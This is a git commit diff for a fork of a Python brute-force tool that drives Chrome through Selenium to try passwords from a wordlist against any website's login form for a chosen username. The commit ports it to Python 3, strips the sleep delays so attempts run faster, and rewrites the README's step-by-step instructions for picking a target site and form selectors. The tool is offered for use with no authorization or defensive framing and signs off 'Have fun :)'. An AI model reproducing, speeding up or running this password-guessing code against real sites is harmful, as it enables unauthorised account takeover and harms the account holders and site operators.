d20296fdd6b11a77508ee08eccf24e1d60952ea9
Ming Wei <hoemingwei24@gmail.com>
2022-06-10 15:43:14 +0800

    compatibility + optimisation

--- README.md
+++ README.md
@@ -21,23 +21,34 @@ python2 main.py
 
 ## Requirements
 ```
-pip2 install selenium
-pip2 install requests
+pip install -r requirements.txt
 ```
 Chrome and chromedriver are required
 
 You can download chromedriver here: http://chromedriver.chromium.org/downloads
-for this fork, create a folder in your C drive called 'webdrivers' and place the executable file inside. If you want to use a different directory, simply change the CHROME_DVR_DIR variable inside the python file.
 
 <br>
-## How to use (text)
-1). Find a website with a login page<br>
-2). Inspect element to find the Selector of the username form<br>
-3). Do the same for the password field<br>
-4). The the login form <br>
-5). When Asked put in the username to brute force<br>
-6). Watch it go!
 
-## How to use (Video)
-[![IMAGE ALT TEXT](https://i.ytimg.com/vi/Hd_kQVnajxk/1.jpg)](https://youtu.be/Hd_kQVnajxk "Video Title")
+**WINDOWS**
+
+> Create a folder in your C drive called 'webdrivers' and place the executable file inside. If you want to use a different directory, simply change the CHROME_DVR_DIR variable inside the python file.
+
+**LINUX**
+
+> Place the executable file (chromedriver) inside your /bin. If you want to use a different directory, simply change the CHROME_DVR_DIR variable inside the python file and ensure that it is set to **PATH**.
+
+<br>
+
+## How to use:
+1) Find a website with a login page<br>
+2) Inspect element to find the Selector of the username form (E.g. #username)<br>
+3) Do the same for the password field (E.g. #password)<br>
+4) And the same for the form submit/POST button of the login form <br>
+5) When Asked put in the username to brute force, do it.<br>
+6) Watch it go!
+
+<br>
+
+## Note:
+- For websites that has the same selector for its login form in its page redirect, the script will not be able to differentiate the webpages and will not mention the successful password input.
 
--- main.py
+++ main.py
@@ -1,5 +1,9 @@
 # Coded by METACHAR
 # Looking to work with other hit me up on my email @metachar1@gmail.com <--
+# Forked and edited by hoemw
+# Converted from Python2 to Python3 with 2to3 + Optimization via removing t.wait().
+
+
 import sys
 import datetime
 import selenium
@@ -42,51 +46,49 @@ parser.add_option("--website", dest="website",help="choose a website")
 (options, args) = parser.parse_args()
 
 
-CHROME_DVR_DIR = 'C:\webdrivers\chromedriver.exe'
+CHROME_DVR_DIR = '/bin/chromedriver'
 
 def wizard():
     print (banner)
-    website = raw_input(color.GREEN + color.BOLD + '\n[~] ' + color.CWHITE + 'Enter a website: ')
+    website = input(color.GREEN + color.BOLD + '\n[~] ' + color.CWHITE + 'Enter a website: ')
     sys.stdout.write(color.GREEN + '[!] '+color.CWHITE + 'Checking if site exists '),
     sys.stdout.flush()
     t.sleep(1)
     try:
         request = requests.get(website)
         if request.status_code == 200:
-            print (color.GREEN + '[OK]'+color.CWHITE)
+            print((color.GREEN + '[OK]'+color.CWHITE))
             sys.stdout.flush()
     except selenium.common.exceptions.NoSuchElementException:
         pass
     except KeyboardInterrupt:
-        print (color.RED + '[!]'+color.CWHITE+ 'User used Ctrl-c to exit')
+        print((color.RED + '[!]'+color.CWHITE+ 'User used Ctrl-c to exit'))
         exit()
     except:
         t.sleep(1)
-        print (color.RED + '[X]'+color.CWHITE)
+        print((color.RED + '[X]'+color.CWHITE))
         t.sleep(1)
-        print (color.RED + '[!]'+color.CWHITE+ ' Website could not be located make sure to use http / https')
+        print((color.RED + '[!]'+color.CWHITE+ ' Website could not be located make sure to use http / https'))
         exit()
 
-    username_selector = raw_input(color.GREEN + '[~] ' + color.CWHITE + 'Enter the username selector: ')
-    password_selector = raw_input(color.GREEN + '[~] ' + color.CWHITE + 'Enter the password selector: ')
-    login_btn_selector = raw_input(color.GREEN + '[~] ' + color.CWHITE + 'Enter the Login button selector: ')
-    username = raw_input(color.GREEN + '[~] ' + color.CWHITE + 'Enter the username to brute-force: ')
-    pass_list = raw_input(color.GREEN + '[~] ' + color.CWHITE + 'Enter a directory to a password list: ')
+    username_selector = input(color.GREEN + '[~] ' + color.CWHITE + 'Enter the username selector: ')
+    password_selector = input(color.GREEN + '[~] ' + color.CWHITE + 'Enter the password selector: ')
+    login_btn_selector = input(color.GREEN + '[~] ' + color.CWHITE + 'Enter the Login button selector: ')
+    username = input(color.GREEN + '[~] ' + color.CWHITE + 'Enter the username to brute-force: ')
+    pass_list = input(color.GREEN + '[~] ' + color.CWHITE + 'Enter a directory to a password list: ')
     brutes(username, username_selector ,password_selector,login_btn_selector,pass_list, website)
 
 def brutes(username, username_selector ,password_selector,login_btn_selector,pass_list, website):
     f = open(pass_list, 'r')
-    driver = webdriver.Chrome(CHROME_DVR_DIR)
     optionss = webdriver.ChromeOptions()
     optionss.add_argument("--disable-popup-blocking")
     optionss.add_argument("--disable-extensions")
-    count = 1 #count
+    optionss.add_argument("--profile-directory=Default")
     browser = webdriver.Chrome(CHROME_DVR_DIR)
     while True:
         try:
             for line in f:
                 browser.get(website)
-                t.sleep(2)
                 Sel_user = browser.find_element_by_css_selector(username_selector) #Finds Selector
                 Sel_pas = browser.find_element_by_css_selector(password_selector) #Finds Selector
                 enter = browser.find_element_by_css_selector(login_btn_selector) #Finds Selector
@@ -94,18 +96,17 @@ def brutes(username, username_selector ,password_selector,login_btn_selector,pas
                 # browser.find_element_by_css_selector(username_selector).clear()
                 Sel_user.send_keys(username)
                 Sel_pas.send_keys(line)
-                t.sleep(5)
-                print '------------------------'
-                print (color.GREEN + 'Tried password: '+color.RED + line + color.GREEN + 'for user: '+color.RED+ username)
-                print '------------------------'
+                print('------------------------')
+                print((color.GREEN + 'Tried password: '+color.RED + line + color.GREEN + 'for user: '+color.RED+ username))
+                print('------------------------')
                 temp = line 
         except KeyboardInterrupt: #returns to main menu if ctrl C is used
             exit()
         except selenium.common.exceptions.NoSuchElementException:
-            print 'AN ELEMENT HAS BEEN REMOVED FROM THE PAGE SOURCE THIS COULD MEAN 2 THINGS THE PASSWORD WAS FOUND OR YOU HAVE BEEN LOCKED OUT OF ATTEMPTS! '
-            print 'LAST PASS ATTEMPT BELLOW'
-            print color.GREEN + 'Password has been found: {0}'.format(temp)
-            print color.YELLOW + 'Have fun :)'
+            print('AN ELEMENT HAS BEEN REMOVED FROM THE PAGE SOURCE THIS COULD MEAN 2 THINGS THE PASSWORD WAS FOUND OR YOU HAVE BEEN LOCKED OUT OF ATTEMPTS! ')
+            print('LAST PASS ATTEMPT BELLOW')
+            print(color.GREEN + 'Password has been found: {0}'.format(temp))
+            print(color.YELLOW + 'Have fun :)')
             exit()
 
 
@@ -121,11 +122,11 @@ banner = color.BOLD + color.RED +'''
   {4}[{5}-{6}]--> {7}coded by Metachar
   {8}[{9}-{10}]-->{11} brute-force tool                      '''.format(color.RED, color.CWHITE,color.RED,color.GREEN,color.RED, color.CWHITE,color.RED,color.GREEN,color.RED, color.CWHITE,color.RED,color.GREEN)
 
-driver = webdriver.Chrome(CHROME_DVR_DIR)
-optionss = webdriver.ChromeOptions()
-optionss.add_argument("--disable-popup-blocking")
-optionss.add_argument("--disable-extensions")
-count = 1 #count
+# driver = webdriver.Chrome(CHROME_DVR_DIR)
+# optionss = webdriver.ChromeOptions()
+# optionss.add_argument("--disable-popup-blocking")
+# optionss.add_argument("--disable-extensions")
+# optionss.add_argument("--profile-directory=Default")
 
 if options.username == None:
     if options.usernamesel == None:
@@ -142,5 +143,5 @@ password_selector = options.passsel
 login_btn_selector = options.loginsel
 website = options.website
 pass_list = options.passlist
-print banner
+print(banner)
 brutes(username, username_selector ,password_selector,login_btn_selector,pass_list, website)
